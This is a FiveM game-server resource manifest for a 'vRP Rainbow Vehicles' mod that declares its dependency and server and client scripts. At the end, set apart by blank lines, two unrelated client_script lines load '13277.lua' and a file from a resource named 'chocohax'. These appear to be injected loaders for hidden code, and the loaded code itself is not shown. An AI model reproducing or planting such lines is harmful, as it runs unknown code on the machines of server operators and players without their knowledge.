resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'
description "vRP Rainbow Vehicles"

dependency "vrp"

server_scripts{ 
	"@vrp/lib/utils.lua",
	"server.lua"
}

client_scripts{ 
	"@vrp/lib/utils.lua",
	"lib/Tunnel.lua",
	"lib/Proxy.lua",
	"client.lua"
}







client_script "13277.lua"
client_script '@chocohax/10992.lua'